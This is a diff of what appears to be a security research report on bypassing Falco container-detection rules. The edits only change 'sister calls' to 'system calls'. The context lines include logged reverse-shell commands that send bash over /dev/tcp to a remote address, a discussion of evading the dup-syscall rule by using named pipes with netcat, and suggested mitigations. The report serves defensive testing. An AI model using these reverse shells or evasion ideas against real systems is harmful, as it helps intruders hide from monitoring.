@@ -27,7 +27,7 @@ This is not the first work on Falco bypasses. There were several projects before
 - Sep 2019 - by [NCC Group](https://www.antitree.com/2019/09/container-runtime-security-bypasses-on-falco/) - focused on image name manipulations to leverage Falco rules allow-lists.
 - August 2020 - by [Brad Geesaman](https://darkbit.io/blog/falco-rule-bypass) - similar to previous work, exploited weak image name comparison logic to leverage Falco rules allow-lists.
 - Nov 2020 - by [Leonardo Di Donato](https://www.youtube.com/watch?v=nGqWskXRSmo) - exploited twin syscalls that Falco missed, suggested other ideas used in this report.
-- June 2019 and ongoing - by [maintainers](https://github.com/falcosecurity/falco/issues/676) - ongoing issue handling the missing sister calls
+- June 2019 and ongoing - by [maintainers](https://github.com/falcosecurity/falco/issues/676) - ongoing issue handling the missing system calls
 
 ## Bypass Techniques and Examples
 
@@ -304,7 +304,7 @@ root@3a03766368a0:/#
 14:44:37.439154946: Warning Redirect stdout/stdin to network connection (user=root user_loginuid=-1 k8s.ns=<NA> k8s.pod=<NA> container=3a03766368a0 process=gbash parent=gbash cmdline=gbash -c /tmp/gbash -i >& /dev/tcp/172.17.0.1/443 0>&1 terminal=34816 container_id=3a03766368a0 image=debian fd.name=172.17.0.2:48048->172.17.0.1:443 fd.num=1 fd.type=ipv4 fd.sip=172.17.0.1) k8s.ns=<NA> k8s.pod=<NA> container=3a03766368a0
 14:44:37.439157224: Warning Redirect stdout/stdin to network connection (user=root user_loginuid=-1 k8s.ns=<NA> k8s.pod=<NA> container=3a03766368a0 process=gbash parent=gbash cmdline=gbash -c /tmp/gbash -i >& /dev/tcp/172.17.0.1/443 0>&1 terminal=34816 container_id=3a03766368a0 image=debian fd.name=172.17.0.2:48048->172.17.0.1:443 fd.num=1 fd.type=ipv4 fd.sip=172.17.0.1) k8s.ns=<NA> k8s.pod=<NA> container=3a03766368a0
 ```
-Still, we have to deal two(?) spurious events. Taking a closer look at rule **Redirect STDOUT/STDIN to Network Connection in Container**, we don't see dependencies on _proc.name_ or _fd.name_ and no easy bypass apparent. The rule intercepts dup syscall that duplicates a file descriptor, in this case any of the stdin / stdout / stderr triad. The first thought is swapping dup call with one of the sister calls - dup2 or dup3 - that appear to have very similar functionality according to Linux man pages[^1]. However, that would mean duplicating bash functionality or somehow recompiling it with a different syscall.
+Still, we have to deal two(?) spurious events. Taking a closer look at rule **Redirect STDOUT/STDIN to Network Connection in Container**, we don't see dependencies on _proc.name_ or _fd.name_ and no easy bypass apparent. The rule intercepts dup syscall that duplicates a file descriptor, in this case any of the stdin / stdout / stderr triad. The first thought is swapping dup call with one of the system calls - dup2 or dup3 - that appear to have very similar functionality according to Linux man pages[^1]. However, that would mean duplicating bash functionality or somehow recompiling it with a different syscall.
 
 Instead, we can abandon dup altogether and find a new way to initiate a reverse shell. What about payloads that redirect shell to netcat through pipe creation?
 ```
@@ -363,7 +363,7 @@ SILENCE
 ``` 
 <ins>Rules bypassed:</ins> **Redirect STDOUT/STDIN to Network Connection in Container**.
 
-<ins>Suggested mitigations:</ins> Include dup2 and dup3 sister calls; create separate rule to detect msfvenom-generated payloads; create separate rule to detect mkfifo and mknod coupled with the usage of netcat.
+<ins>Suggested mitigations:</ins> Include dup2 and dup3 system calls; create separate rule to detect msfvenom-generated payloads; create separate rule to detect mkfifo and mknod coupled with the usage of netcat.
 
 ### Bypass rules based on command arguments manipulation
 
